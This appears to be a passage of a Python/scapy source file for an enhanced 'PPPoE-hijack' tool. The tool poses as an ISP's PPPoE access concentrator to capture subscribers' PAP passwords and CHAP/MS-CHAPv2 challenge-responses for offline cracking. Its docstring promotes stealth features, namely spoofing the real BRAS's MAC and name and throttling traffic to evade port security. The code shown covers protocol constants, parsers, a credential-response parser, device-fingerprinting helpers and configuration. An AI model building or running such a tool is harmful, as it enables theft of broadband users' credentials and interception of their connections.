# coding: utf-8
"""PPPoE 拨号服务器伪装 v2.1 —— Python 3 + scapy 2.7
================================================================
原始工程: https://github.com/zhengwuji/PPPoE-hijack   (Karblue, 2016-02-27)
原始实现: Python 2 + scapy 2.1/2.2，靠 `raw.load` 直接改写嗅探到的字节

v1 (移植): 让 2016 年的逻辑能在 Python 3 + scapy 2.7 上跑起来（不改协议行为）。
v2 (本文件): 按「能否真的拿到账号」→「抢不抢得到」→「拿几次」的顺序做了全面优化。

相对原版的机制性修改
--------------------
 1. Python 3 化；不再依赖 `raw.load`（scapy>=2.4 会把 LCP/PAP 解成具名层，
    `pkt.load` 读写都 AttributeError）→ 改为「取 PPP 载荷 bytes → 改字节 → 重组帧」。
 2. 自环防护：原版会把自发的 LCP-Config-Req 当新客户端，无限发包。
 3. 网卡/过滤显式化：sniff(iface=...) + BPF 预过滤，发送统一带 iface。

v2 新增（全部可关，默认见各自说明）
----------------------------------
 A. 认证协商
    - CHAP / MS-CHAPv2 / MS-CHAPv1 分支（原版只有 PAP）：客户端用 Nak 拒绝 PAP 时
      自动切换到它要的算法，并主动下发 Challenge，抓 Challenge+Response 供离线爆破。
    - 正确回应客户端对自己 Configure-Req 的 Ack/Nak/Reject：Nak 中缺 Auth-Protocol
      时用 Nak「塞」进我们指定的认证协议（authenticator 的规范做法）。

 B. LCP 状态机 / 保活
    - Echo-Request → Echo-Reply（不回会被客户端判链路 down，几十秒就重拨）。
    - Terminate-Request → Term-Reply + 回收会话；Protocol-Reject / Code-Reject 记录。
    - 我方 Config-Req 定时重传（--lcp-retry/--lcp-maxretry）。
    - 客户端重传去重：同一 (proto, code, id, 载荷) 原样重发上次的回包，不重复决策、
      不重复落盘。会话 TTL 回收（--session-ttl），修掉原版 clientMap 永不过期的漏抓。
    - 多客户端各自分配 sessionid（原版硬编码 0x01）。

 C. PAP
    - Nak 回显客户端的 PAP id（原版硬编码 id=2，部分客户端会忽略）。
    - --pap-mode ack：回 Ack 让会话建立，继续走 IPCP，下发假地址把客户端「留住」。

 D. 速度（PADO 竞速靠这个）
    - 复用同一个二层 socket（原版/`sendp()` 每次调用都新建 socket）。
    - 预构造 20/22 字节头模板（bytearray），运行时只改 dst / code / sid / len / proto。
    - 收/发解耦：嗅探回调只入队，独立发送线程 + 令牌桶限速（--rate）。
    - AsyncSniffer + conf.verb=0 + BPF 加 ether dst 条件（--dst-filter）。

 E. 工程化
    - 配置化：TOML 配置文件 + CLI（CLI 优先）；AC-Name/Service-Name/sessionid/
      PAP Ack|Nak/IPCP 全部可配。
    - 凭据落盘 SQLite(*.db) 或 JSONL(其它)：时间戳、MAC、sessionid、BRAS MAC、
      AC-Name、认证类型、原始 hex（供离线爆破）、IPCP 地址。
    - logging + QueueHandler/QueueListener：嗅探线程不阻塞在 I/O 上；
      -q 静音噪声但凭据照打。
    - --list-ifaces / --dry-run / --replay pcpa / --pcap-out：不需要 Npcap 就能回归测试。

 F. 隐蔽性
    - --learn-ac：从真 BRAS 的 PADO/PADS 学到它的 MAC 与 AC-Name，然后冒充它
      （而不是永远用 0a:0a:0a:0a:0a:0a 这种一眼可见的固定 MAC）。
    - --rate 令牌桶限速，避免洪泛触发端口安全/风暴抑制。

 G. 现代光猫/路由器适配（v2.1）—— 现在的接入侧早就不是 2016 年的样子了
    - VLAN / QinQ：运营商 PPPoE 普遍带 802.1Q（IPTV/上网/语音各自一个 VLAN），
      企业侧还有 802.1ad 双层 tag。--vlan auto 自动跟随客户端帧的 tag 原样回包，
      --vlan 41 --vlan-prio 5 则强制打指定 tag；发现/会话帧偏移全部按 tag 长度重算。
    - Service-Name 匹配：现代路由器/机顶盒常带 Service-Name 并在 PADO 里挑剔，
      默认**回显客户端请求的名字**（而不是永远空 tag）；--service-strict 时对不认识的
      名字按 RFC 2516 回 PADS + Service-Name-Error(0x0201)。
    - Relay-Session-Id(0x0110) 回显、AC-Cookie(0x0104，--ac-cookie)、
      PPP-Max-Payload(0x0120，--max-payload，RFC 4638 baby jumbo)。
    - IPv6CP(0x8057)：双栈客户端协商 IPv6 时回 Ack + 我方 Interface-Identifier，
      不让它因为「IPv6 协商失败」提前重拨。
    - 多拨：同一 MAC 的多个 PADR 分配不同 sessionid，会话按 (MAC, sessionid) 路由，
      支持光猫/路由器双拨多拨场景。
    - 802.1X/EAPOL(0x888E) 与 DHCP(Option 60/61/77/12)：被动记录设备指纹
      （Vendor Class Identifier、Client Identifier、主机名、EAP Identity）。
    - OUI 厂商识别：会话日志与落盘里直接标出设备厂商（华为/中兴/小米/TP-LINK…），
      --oui-file 可加载/覆盖自己的 OUI 表。
    - --profile legacy|modern|ont 一键套用「保持 2016 原版字节兼容 / 现代设备 / 光猫桥接」
      三套参数。

用法
----
    pip install scapy
    # Windows 需 Npcap（安装时勾选 WinPcap API 兼容模式），Linux 需 root + libpcap
    python pppoe_hijack_py3.py --list-ifaces
    python pppoe_hijack_py3.py -i "以太网"
    python pppoe_hijack_py3.py -i eth0 --auth-order mschapv2,pap --pap-mode ack --ipcp on
    # 现代光猫/路由器（带 VLAN、双栈、可能前面还有 802.1X）：
    python pppoe_hijack_py3.py -i eth0 --profile modern --vlan auto --learn-ac
    python pppoe_hijack_py3.py -i eth0 --vlan 41 --vlan-prio 5 --max-payload 1500 --ipv6cp on
    python pppoe_hijack_py3.py -c config.toml
    # 离线回归（不需要 Npcap）：
    python pppoe_hijack_py3.py --replay capture.pcap --pcap-out tx.pcap -o creds.jsonl
"""

from __future__ import annotations

import argparse
import collections
import json
import logging
import logging.handlers
import os
import queue
import sqlite3
import sys
import threading
import time
import uuid
from dataclasses import dataclass, field
from typing import Callable, Dict, List, Optional, Tuple

from scapy.all import (AsyncSniffer, Ether, PcapReader, PcapWriter, PPP, PPPoE,
                       PPPoED, conf, get_if_hwaddr, get_working_ifaces)

# 现代设备适配用到的可选层（VLAN / 802.1X / DHCP）。scapy 各版本导出位置略有差异，
# 缺哪个就退化成「只按原始字节处理」，不影响主流程。
try:
    from scapy.all import Dot1AD, Dot1Q
except Exception:  # pragma: no cover
    Dot1Q = Dot1AD = None                    # type: ignore
try:
    from scapy.all import EAP, EAPOL
except Exception:  # pragma: no cover
    EAPOL = EAP = None                       # type: ignore
try:
    from scapy.all import BOOTP, DHCP, IP, UDP
except Exception:  # pragma: no cover
    BOOTP = DHCP = IP = UDP = None           # type: ignore

# 再导出给调用方/测试直接用；PPPoED 在本模块内部不引用，故显式列入 __all__。
__all__ = [
    "Ether", "PPP", "PPPoE", "PPPoED", "conf", "AsyncSniffer", "PcapReader", "PcapWriter",
    "Config", "Session", "PPPoEServer", "Store", "RateLimiter", "L2Sender", "DryRunSender",
    "build_config", "build_bpf", "print_ifaces", "run_live", "run_replay", "main",
    "find_layer", "pppoe_layer", "ppp_payload", "norm_mac", "split_auth", "parse_mschapv2",
    "oui_vendor", "vlan_tags", "eth_type", "load_oui_file", "PROFILES", "OUI_VENDORS",
]

if sys.version_info >= (3, 11):
    import tomllib
else:  # pragma: no cover
    tomllib = None

__version__ = "2.1"

log = logging.getLogger("pppoe-hijack")          # 一般日志（-q 会静音 INFO）
credlog = logging.getLogger("pppoe-hijack.creds")  # 凭据日志（-q 也照打）

# ---------------------------------------------------------------- 常量

DEFAULT_MAC = "0a:0a:0a:0a:0a:0a"
BROADCAST = "ff:ff:ff:ff:ff:ff"

ETH_P_PPPOE_DISCOVERY = 0x8863
ETH_P_PPPOE_SESSION = 0x8864

CODE_PADI = 0x09
CODE_PADO = 0x07
CODE_PADR = 0x19
CODE_PADS = 0x65
CODE_PADT = 0xA7

PROTO_LCP = 0xC021
PROTO_PAP = 0xC023
PROTO_CHAP = 0xC223
PROTO_IPCP = 0x8021
PROTO_IPV6CP = 0x8057          # RFC 5072：双栈客户端会协商它
PROTO_IPV4 = 0x0021
PROTO_IPV6 = 0x0057
PROTO_EAPOL = 0x888E           # 802.1X，光猫桥接/企业网里常见在 PPPoE 之前

ETH_P_VLAN_C = 0x8100          # 802.1Q
ETH_P_VLAN_S = 0x88A8          # 802.1ad（QinQ 外层）

# LCP / IPCP 共用同一套 code
CONF_REQ, CONF_ACK, CONF_NAK, CONF_REJ = 1, 2, 3, 4
TERM_REQ, TERM_ACK, CODE_REJ = 5, 6, 7
PROT_REJ, ECHO_REQ, ECHO_REPLY = 8, 9, 10

CHAP_CHALLENGE, CHAP_RESPONSE, CHAP_SUCCESS, CHAP_FAILURE = 1, 2, 3, 4

PAP_AUTH_REQ, PAP_AUTH_ACK, PAP_AUTH_NAK = 1, 2, 3

OPT_MRU = 1
OPT_ACCM = 2
OPT_AUTH_PROTOCOL = 3
OPT_QUALITY = 4
OPT_MAGIC = 5
OPT_FCS_ALTERNATIVES = 6
OPT_PFC = 7
OPT_ACFC = 8
IPCP_OPT_IP_ADDR = 3
IPV6CP_OPT_IID = 1             # RFC 5072 Interface-Identifier

# PPPoE Tag（RFC 2516 全家桶 + RFC 4638 + 实际设备会用到的）
TAG_SERVICE_NAME = 0x0101
TAG_AC_NAME = 0x0102
TAG_HOST_UNIQ = 0x0103
TAG_AC_COOKIE = 0x0104          # AC-Cookie：PADO 里给了，PADR 必须带回
TAG_VENDOR_SPECIFIC = 0x0105    # 实为 DSLAM/OLT 注入的 circuit-id/remote-id（BRAS 转成
                                # RADIUS NAS-Port-Id）；AC 侧不解释、更不应回送，本工具只旁听
TAG_RELAY_SESSION_ID = 0x0110   # PPPoE 中继/双拨场景必回显（已存在则不得再添一个）
TAG_HOST_URL = 0x0111           # Carrel 草案遗物，无 RFC 正文 → 语义存疑，按未知 tag 忽略
TAG_MOTM = 0x0112               # 同上，存疑
TAG_PPP_MAX_PAYLOAD = 0x0120    # RFC 4638 baby jumbo：MTU 1500 的关键 tag
TAG_SERVICE_NAME_ERROR = 0x0201
TAG_AC_SYSTEM_ERROR = 0x0202
TAG_GENERIC_ERROR = 0x0203

# RFC 2516 §7：这几个 LCP 选项 authenticator MUST NOT 请求、且 MUST 拒绝客户端请求
LCP_MUST_REJECT = (OPT_ACCM, OPT_QUALITY, OPT_FCS_ALTERNATIVES, OPT_PFC, OPT_ACFC)

# 认证协议选项（type=3）：PAP 是 4 字节，CHAP 系列要带 1 字节算法号
AUTH_OPTION = {
    "pap":      b"\x03\x04\xc0\x23",           # PAP
    "chap":     b"\x03\x05\xc2\x23\x05",       # CHAP + MD5
    "mschapv2": b"\x03\x05\xc2\x23\x81",       # MS-CHAPv2
    "mschapv1": b"\x03\x05\xc2\x23\x80",       # MS-CHAPv1
}
# (proto, algo) → 名字，用于解析客户端 Nak/Reject 里要的东西
AUTH_BY_ALGO = {
    (PROTO_PAP, None): "pap",
    (PROTO_CHAP, 0x05): "chap",
    (PROTO_CHAP, 0x81): "mschapv2",
    (PROTO_CHAP, 0x80): "mschapv1",
}

MRU_OPTION = b"\x01\x04\x05\xc8"        # MRU 1500（RFC 4638 的默认；--mru 可改）
MAGIC_OPTION = b"\x05\x06\x5e\x63\x0a\xb8"  # Magic-Number（沿用原版常量）
# 原版的 4 个 0x00 尾字节严格说不是合法选项（type=0/len=0 会终止选项表），
# 但 2016 年它工作过；非 --strict-rfc 时原样保留以求字节级兼容。
V1_TAIL = b"\x00\x00\x00\x00"

# 同一个 MAC 在这么长时间内重发 PADR 视为「重传」，复用已分配的 sessionid；
# 超过则认为是第二轮拨号（现代路由器双拨/多拨），分配新的 sessionid。
PADR_REUSE_WINDOW = 5.0
# 同一个 MAC 最多同时维持几条假会话，防止对端刷 PADR 把内存吃光
DEFAULT_MAX_SESSIONS = 8

LOG_FORMAT = "%(asctime)s %(levelname)-7s %(message)s"

# 常见光猫/路由器/ONT 厂商 OUI（经 IEEE/maclookup 数据源核对；仍只是「厂商」推断，
# 不能证明型号 —— 光猫大量使用 ODM 前缀，如共进电子 00:1f:a4）。
# 未知前缀显示 "?"，不影响功能；可用 --oui-file 覆盖或补充。
OUI_VENDORS = {
    # 华为 / 华为终端
    "00:e0:fc": "Huawei 华为", "28:6e:d4": "Huawei 华为", "00:25:9e": "Huawei 华为",
    "48:ad:08": "Huawei 华为", "ac:e2:15": "Huawei 华为", "78:1d:ba": "Huawei 华为",
    "5c:7d:5e": "Huawei 华为", "10:47:80": "Huawei 华为",
    "8c:5a:c1": "Huawei Device 华为终端", "4c:b1:6c": "Huawei Device 华为终端",
    # 中兴
    "00:15:eb": "ZTE 中兴", "00:19:c6": "ZTE 中兴", "34:e0:cf": "ZTE 中兴",
    "4c:09:b4": "ZTE 中兴", "dc:02:8e": "ZTE 中兴", "00:22:93": "ZTE 中兴",
    "e0:38:3f": "ZTE 中兴",
    # 小米
    "64:cc:2e": "Xiaomi 小米", "8c:be:be": "Xiaomi 小米", "f0:b4:29": "Xiaomi 小米",
    "78:11:dc": "Xiaomi 小米", "04:cf:8c": "Xiaomi 小米", "50:64:2b": "Xiaomi 小米",
    "28:6c:07": "Xiaomi 小米", "34:ce:00": "Xiaomi 小米",
    # TP-LINK
    "00:1d:0f": "TP-LINK", "14:cc:20": "TP-LINK", "50:c7:bf": "TP-LINK",
    "60:32:b1": "TP-LINK", "a4:2b:b0": "TP-LINK", "ec:08:6b": "TP-LINK",
    "d0:76:e7": "TP-LINK",
    # H3C 新华三
    "00:0f:e2": "H3C 新华三", "00:23:89": "H3C 新华三", "70:f9:6d": "H3C 新华三",
    "3c:8c:40": "H3C 新华三",
    # 烽火
    "f8:c9:6c": "Fiberhome 烽火", "60:b6:17": "Fiberhome 烽火",
    "00:0a:c2": "武汉烽火数码",
    # 瑞斯康达（运营商 ONU/ONT 大厂）
    "00:0e:5e": "Raisecom 瑞斯康达", "98:00:74": "Raisecom 瑞斯康达",
    "a8:6d:5f": "Raisecom 瑞斯康达", "20:1f:54": "Raisecom 瑞斯康达",
    "2c:b6:c8": "Raisecom 瑞斯康达", "4c:b9:11": "Raisecom 瑞斯康达",
    "54:76:b2": "Raisecom 瑞斯康达", "78:91:e9": "Raisecom 瑞斯康达",
    "b8:a1:4a": "Raisecom 瑞斯康达", "c8:50:e9": "Raisecom 瑞斯康达",
    "cc:c2:e0": "Raisecom 瑞斯康达",
    # 上海贝尔 / 阿尔卡特（电信宽带常见）
    "08:47:d0": "Nokia Shanghai Bell 上海贝尔", "08:9c:86": "Nokia Shanghai Bell",
    "10:47:38": "Nokia Shanghai Bell", "28:6f:b9": "Nokia Shanghai Bell",
    "30:23:64": "Nokia Shanghai Bell", "3c:bd:69": "Nokia Shanghai Bell",
    "4c:21:13": "Nokia Shanghai Bell", "50:02:38": "Nokia Shanghai Bell",
    "54:9f:06": "Nokia Shanghai Bell", "64:db:f7": "Nokia Shanghai Bell",
    "00:1a:f0": "Alcatel-Lucent 阿尔卡特", "00:80:9f": "Alcatel 阿尔卡特",
    "00:e0:b1": "Alcatel 阿尔卡特",
    # Sagemcom / Zyxel
    "34:db:9c": "Sagemcom", "7c:03:d8": "Sagemcom", "9c:24:72": "Sagemcom",
    "00:1f:95": "Sagemcom", "00:0e:59": "Sagemcom",
    "5c:f4:ab": "Zyxel 合勤", "00:13:49": "Zyxel 合勤", "b0:b2:dc": "Zyxel 合勤",
    # 创维数字（机顶盒/ONT，来源为厂商页，置信度中等）
    "f0:90:08": "Skyworth 创维", "e0:28:b1": "Skyworth 创维",
    "e8:22:b8": "Skyworth 创维", "c8:13:8b": "Skyworth 创维",
    "c0:8f:20": "Skyworth 创维", "ac:88:66": "Skyworth 创维",
    # ODM / 其它
    "00:1f:a4": "深圳共进电子 ODM", "00:e0:0f": "上海贝尔数据通信(旧)",
    # 虚拟化（实验室里一眼认出来）
    "52:54:00": "QEMU/KVM 虚拟网卡", "00:0c:29": "VMware 虚拟机",
    "00:50:56": "VMware 虚拟机", "08:00:27": "VirtualBox 虚拟机",
    "00:1b:21": "Intel 网卡", "3c:97:0e": "Intel 网卡", "7c:7a:91": "Intel 网卡",
    "00:11:32": "Synology 群晖",
}

# 一键参数组合：--profile legacy|modern|ont（在 TOML/CLI 之前套用，可被后者覆盖）
PROFILES: Dict[str, dict] = {
    # 2016 原版行为：无 VLAN、只 PAP、非 strict、MRU 1480（原版字节 05c8）、字节级复刻
    "legacy": {"vlan": "off", "eapol": "off", "dhcp": "off", "ipv6cp": "off",
               "max_payload": 0, "ac_cookie": False, "relay_sid": True, "mru": 1480},
    # 现代家用/企业接入：VLAN 自动跟随、双栈、记录 802.1X 与 DHCP 指纹
    # MRU 1492 是现网 PPPoE over 以太 的常见安全值（RFC 4638 的 1500 需客户端带 0x0120）
    "modern": {"vlan": "auto", "eapol": "log", "dhcp": "log", "ipv6cp": "on",
               "max_payload": 0, "ac_cookie": False, "relay_sid": True,
               "learn_ac": True, "mru": 1492, "service_strict": False},
    # 光猫桥接 + 运营商 VLAN（不带双栈：老光猫只跑 IPv4，避免多余协商）
    "ont": {"vlan": "auto", "eapol": "log", "dhcp": "log", "ipv6cp": "off",
            "max_payload": 0, "learn_ac": True, "mru": 1492, "service_strict": False},
}


# ---------------------------------------------------------------- 小工具

def norm_mac(mac) -> str:
    """统一成 aa:bb:cc:dd:ee:ff 小写形式（用于比较与 BPF）"""
    h = "".join(c for c in str(mac).lower() if c in "0123456789abcdef")
    if len(h) == 12:
        return ":".join(h[i:i + 2] for i in range(0, 12, 2))
    return str(mac).lower()


_MACB_CACHE: Dict[str, bytes] = {}


def mac_bytes(mac: str) -> bytes:
    """MAC 字符串 → 6 字节，带缓存（发送热路径上会被反复调用）"""
    b = _MACB_CACHE.get(mac)
    if b is None:
        h = norm_mac(mac).replace(":", "")
        b = bytes.fromhex(h) if len(h) == 12 else b"\x00" * 6
        _MACB_CACHE[mac] = b
    return b


def ip_bytes(text: str) -> bytes:
    try:
        parts = [int(p) & 0xFF for p in str(text).split(".")]
        if len(parts) == 4:
            return bytes(parts)
    except Exception:
        pass
    return b"\x0a\x00\x00\x01"


def local_mac(iface=None) -> str:
    """取本机 MAC；取不到退回 uuid.getnode()（原版做法，多网卡下不准）"""
    try:
        return norm_mac(get_if_hwaddr(iface or conf.iface))
    except Exception:
        h = uuid.UUID(int=uuid.getnode()).hex[-12:]
        return ":".join(h[i:i + 2] for i in range(0, 12, 2))


def find_layer(pkt, cls):
    """沿 payload 链找某一层。

    坑：scapy>=2.4 的 haslayer()/getitem() 是「精确类匹配」，发现阶段实际类是
    子类 PPPoED，所以 haslayer(PPPoE)==0、pkt[PPPoE] 抛 IndexError。
    """
    lyr = pkt
    while lyr is not None:
        if isinstance(lyr, cls):
            return lyr
        nxt = getattr(lyr, "payload", None)
        if nxt is None or nxt is lyr or type(nxt).__name__ == "NoPayload":
            break
        lyr = nxt
    return None


def pppoe_layer(pkt):
    return find_layer(pkt, PPPoE)


def ppp_payload(pkt) -> bytes:
    """取 PPP 之后（LCP/PAP/CHAP/IPCP）的原始字节，不关心 scapy 解成了哪一层"""
    ppp = find_layer(pkt, PPP)
    if ppp is None:
        return b""
    return bytes(ppp.payload)


def parse_options(body: bytes) -> List[bytes]:
    """把 LCP/IPCP 选项区拆成 [(type,len,...)] 的原始片段列表（容错到不合法就停）"""
    out: List[bytes] = []
    i, n = 0, len(body)
    while i + 2 <= n:
        otype, olen = body[i], body[i + 1]
        if otype == 0 or olen < 2 or i + olen > n:
            break
        out.append(body[i:i + olen])
        i += olen
    return out


def parse_tags(tags: bytes) -> List[Tuple[int, bytes]]:
    """拆 PPPoE tag 列表 → [(tag_id, value)]。

    比 `bytes.find(tag_id)` 靠谱：后者会在**值**里误命中（比如 Host-Uniq 里恰好含
    0x0103），现代设备给的 Host-Uniq 是随机数，很容易撞上。
    """
    out: List[Tuple[int, bytes]] = []
    i, n = 0, len(tags)
    while i + 4 <= n:
        tid = int.from_bytes(tags[i:i + 2], "big")
        ln = int.from_bytes(tags[i + 2:i + 4], "big")
        if i + 4 + ln > n:
            break
        out.append((tid, tags[i + 4:i + 4 + ln]))
        i += 4 + ln
    return out


def find_tag(tags: bytes, tag_id: int) -> Optional[bytes]:
    """在 PPPoE tag 列表里取第一个某 id 的 value"""
    for tid, val in parse_tags(tags):
        if tid == tag_id:
            return val
    return None


def tag_bytes(tag_id: int, value: bytes) -> bytes:
    return tag_id.to_bytes(2, "big") + len(value).to_bytes(2, "big") + value


def mru_option(mru: int) -> bytes:
    """MRU 选项：01 04 <2 字节大端>。默认 1500（RFC 4638 baby jumbo）。"""
    return bytes([OPT_MRU, 4]) + (int(mru) & 0xFFFF).to_bytes(2, "big")


def vlan_tag_bytes(vid: int, prio: int = 0, dei: int = 0, tpid: int = ETH_P_VLAN_C) -> bytes:
    """构造一个 802.1Q / 802.1ad tag（4 字节：TPID + TCI）"""
    tci = ((int(prio) & 0x7) << 13) | ((int(dei) & 0x1) << 12) | (int(vid) & 0xFFF)
    return int(tpid).to_bytes(2, "big") + tci.to_bytes(2, "big")


def vlan_tags(pkt) -> bytes:
    """取出 Ether 与 PPPoE 之间的全部 VLAN tag 原始字节（单层 4B / QinQ 8B）。

    运营商 PPPoE 常见带 802.1Q（IPTV/上网/语音各自 VLAN），企业侧还有 802.1ad
    双层 tag。这里不解释业务含义，只负责**原样跟随**。
    """
    out = b""
    lyr = pkt
    while lyr is not None:
        name = type(lyr).__name__
        if name in ("Dot1Q", "Dot1AD") or (Dot1Q is not None and isinstance(lyr, Dot1Q)):
            vid = int(getattr(lyr, "vlan", getattr(lyr, "id", 0)) or 0)
            out += vlan_tag_bytes(vid, int(getattr(lyr, "prio", 0) or 0),
                                  int(getattr(lyr, "dei", 0) or 0),
                                  ETH_P_VLAN_S if name == "Dot1AD" else ETH_P_VLAN_C)
        nxt = getattr(lyr, "payload", None)
        if nxt is None or nxt is lyr or type(nxt).__name__ == "NoPayload":
            break
        lyr = nxt
    return out


def eth_type(pkt) -> int:
    """取以太类型，穿透 802.1Q / 802.1ad 外层 tag。

    `pkt.type` 在带 VLAN 的帧上是 0x8100/0x88a8，直接比较会漏掉所有打了
    VLAN 的光猫流量 —— 这就是为什么要单独一个函数。
    """
    etype = int(getattr(pkt, "type", 0) or 0)
    lyr = pkt
    while etype in (ETH_P_VLAN_C, ETH_P_VLAN_S):
        lyr = getattr(lyr, "payload", None)
        if lyr is None or type(lyr).__name__ == "NoPayload":
            break
        etype = int(getattr(lyr, "type", 0) or 0)
    return etype


def vlan_summary(tags: bytes) -> str:
    """把 tag 原始字节转成人能看的 "41"/"41,8"（vid 或 svid,cvid）"""
    out = []
    for i in range(0, len(tags) - 3, 4):
        tci = int.from_bytes(tags[i + 2:i + 4], "big")
        out.append("%d%s" % (tci & 0xFFF, "(p%d)" % ((tci >> 13) & 0x7) if (tci >> 13) & 0x7 else ""))
    return ",".join(out)


def _txt(val) -> str:
    return val.decode("utf-8", "replace") if isinstance(val, (bytes, bytearray)) else str(val)


def oui_vendor(mac, table: Optional[Dict[str, str]] = None) -> str:
    """MAC 前 3 字节 → 厂商名（查不到返回 "?"）

    注意：OUI 只说明**厂商**，不能推断型号 —— 光猫还有大量 ODM 前缀
    （比如共进电子 00:1f:a4 会贴到很多品牌上）。用 `--oui-file` 可以补。
    """
    tbl = OUI_VENDORS if table is None else table
    return tbl.get(norm_mac(mac)[:8], "?")


def load_oui_file(path: str, base: Optional[Dict[str, str]] = None) -> Dict[str, str]:
    """加载自定义 OUI 表：每行 `aa:bb:cc,厂商名`（逗号/空白分隔，# 注释）"""
    tbl = dict(OUI_VENDORS if base is None else base)
    with open(path, "r", encoding="utf-8") as fh:
        for line in fh:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.replace(",", " ").split()
            if len(parts) < 2:
                continue
            prefix = norm_mac(parts[0])
            if len(prefix) >= 8:
                tbl[prefix[:8]] = " ".join(parts[1:])
    return tbl


EAPOL_TYPES = {0: "EAP-Packet", 1: "EAPOL-Start", 2: "EAPOL-Logoff", 3: "EAPOL-Key"}
EAP_CODES = {1: "Request", 2: "Response", 3: "Success", 4: "Failure"}
EAP_TYPES = {1: "Identity", 4: "MD5-Challenge", 13: "TLS", 21: "TTLS", 25: "PEAP",
             26: "MSCHAPv2", 18: "SIM", 23: "AKA", 43: "FAST"}


def eap_identity(pkt) -> Tuple[str, str]:
    """取 802.1X 的 (可读身份标签, EAP Identity)

    光猫桥接/企业网的设备指纹之一：`EAP-Response/Identity` 里的字符串
    常见形式是 `用户名@域名` / `SN@domain` / 纯 MAC。
    """
    if EAPOL is None:
        return "", ""
    ol = find_layer(pkt, EAPOL)
    if ol is None:
        return "", ""
    kind = EAPOL_TYPES.get(int(getattr(ol, "type", 0) or 0), "EAPOL-type=%s" % getattr(ol, "type", "?"))
    ident = ""
    if EAP is not None:
        eap = find_layer(pkt, EAP)
        if eap is not None:
            code = EAP_CODES.get(int(getattr(eap, "code", 0) or 0), "code=%s" % getattr(eap, "code", "?"))
            etype = EAP_TYPES.get(int(getattr(eap, "type", 0) or 0), "type=%s" % getattr(eap, "type", "?"))
            kind = "EAP-%s/%s" % (code, etype)
            if getattr(eap, "identity", None) is not None:
                ident = _txt(getattr(eap, "identity"))
    return kind, ident


def parse_dhcp(pkt) -> dict:
    """取 DHCP 里的设备信息：Option 12 主机名 / 60 Vendor Class / 61 Client ID / 77 User Class"""
    rec: dict = {}
    if BOOTP is not None:
        bootp = find_layer(pkt, BOOTP)
        if bootp is not None:
            chaddr = getattr(bootp, "chaddr", None)
            if chaddr:
                raw = bytes(chaddr)[:6]
                if len(raw) == 6:
                    rec["mac"] = ":".join("%02x" % b for b in raw)
    if DHCP is not None:
        dhcp = find_layer(pkt, DHCP)
        if dhcp is not None:
            for opt in (getattr(dhcp, "options", None) or []):
                try:
                    name, val = opt[0], opt[1]
                except Exception:
                    continue
                if name == "hostname":
                    rec["hostname"] = _txt(val)
                elif name == "vendor_class_id":
                    rec["vendor_class"] = _txt(val)
                elif name == "user_class":
                    rec["user_class"] = _txt(val)
                elif name == "client_id":
                    rec["client_id"] = val.hex() if isinstance(val, (bytes, bytearray)) else str(val)
    return rec


def lcp_frame(code: int, ident: int, body: bytes, length: Optional[int] = None) -> bytes:
    """LCP/IPCP 帧: code | id | len(2) | body。length 用于复刻原版那个 18 的长度字段。"""
    ln = (4 + len(body)) if length is None else length
    return bytes([code, ident]) + ln.to_bytes(2, "big") + body


def auth_frame(code: int, ident: int, value_size: int, value: bytes, name: bytes = b"") -> bytes:
    """PAP/CHAP 帧: code | id | len(2) | value_size(1) | value | name"""
    body = bytes([value_size]) + value + name
    return bytes([code, ident]) + (4 + len(body)).to_bytes(2, "big") + body


def split_auth(payload: bytes) -> Tuple[bytes, bytes]:
    """拆 PAP/CHAP 帧的 (value, name)"""
    if len(payload) < 5:
        return b"", b""
    vsize = payload[4]
    return payload[5:5 + vsize], payload[5 + vsize:]


def parse_auth_proto(opt: bytes) -> Tuple[int, Optional[int]]:
    """Auth-Protocol 选项 → (proto, algo)"""
    proto = int.from_bytes(opt[2:4], "big")
    algo = opt[4] if len(opt) >= 5 else None
    return proto, algo


def parse_mschapv2(value: bytes) -> dict:
    """MS-CHAPv2 Response 的 value 拆 PeerChallenge / Reserved / NTResponse / Flags

    RFC 2759 的取值是 1(长度) + 16 + 8 + 24 + 1 = 50；也有实现给 49 或 48，
    这里对三种布局都做兼容。
    """
    if len(value) >= 49 and value[0] == 16:
        peer, rest = value[1:17], value[17:]
    elif len(value) >= 48:
        peer, rest = value[0:16], value[16:]
    else:
        return {}
    if len(rest) < 32:
        return {}
    return {"peer_challenge": peer.hex(),
            "nt_response": rest[8:32].hex(),
            "flags": rest[32:33].hex()}


# ---------------------------------------------------------------- 配置

@dataclass
class Config:
    iface: Optional[str] = None
    mac: Optional[str] = None                 # None = 用 DEFAULT_MAC 起步并尝试学真 BRAS
    learn_ac: Optional[bool] = None           # None = 自动（未显式 --mac 时开启）
    service_name: str = ""
    ac_name: str = "^_^"                      # 原版指纹；--learn-ac 时会被真 BRAS 的名字覆盖
    sessionid: int = 0                        # 0 = 每个客户端自动分配
    session_ttl: float = 120.0                # 秒；0 = 不回收
    lcp_mode: str = "nak"                     # nak（规范）| reject（原版行为）
    strict_rfc: bool = False                  # True = 去掉原版那 4 个尾 0，长度字段按 RFC 1661 写 4+len(opts)
    auth_order: str = "pap,mschapv2,chap,mschapv1"
    auth_retry: int = 3                       # 认证协议切换次数上限
    lcp_retry: float = 3.0                    # 我方 Config-Req 重传间隔
    lcp_maxretry: int = 10
    pap_mode: str = "nak"                     # nak（原版，让客户端重拨）| ack（建立会话进 IPCP）
    chap_reply: str = "fail"                  # fail（原版风格）| success
    ipcp: str = "auto"                        # auto（会话存活时才做）| on | off
    ipcp_local: str = "10.0.0.1"
    ipcp_peer: str = "10.0.0.2"
    rate: int = 200                           # 发包限速（包/秒），0 = 不限
    dst_filter: str = "auto"                  # auto | strict | any
    store: Optional[str] = "creds.jsonl"
    replay: Optional[str] = None
    replay_send: bool = False
    pcap_out: Optional[str] = None
    dry_run: bool = False
    stats: float = 30.0
    quiet: bool = False
    list_ifaces: bool = False

    # ---- 现代设备适配（v2.1）
    profile: str = ""                         # legacy | modern | ont（预设，先套用后被覆盖）
    vlan: str = "off"                         # off | auto（跟随客户端）| 0-4095 / 0x 值
    vlan_prio: int = 0                        # 802.1p 优先级 0-7
    mru: int = 1480                           # 我方 LCP 提议的 MRU（1480 = 2016 原版字节 05c8）
    max_payload: int = 0                      # PPP-Max-Payload tag(0x0120)；0 = 不发
    service_strict: bool = False              # Service-Name 不认识 → PADS + Service-Name-Error
    ac_cookie: bool = False                   # PADO 带 AC-Cookie（更真实，客户端需回显）
    relay_sid: bool = True                    # 回显 Relay-Session-Id(0x0110)
    multi_session: bool = True                # 同一 MAC 允许多会话（光猫/路由器双拨）
    max_sessions: int = DEFAULT_MAX_SESSIONS  # 同一 MAC 的并发会话上限
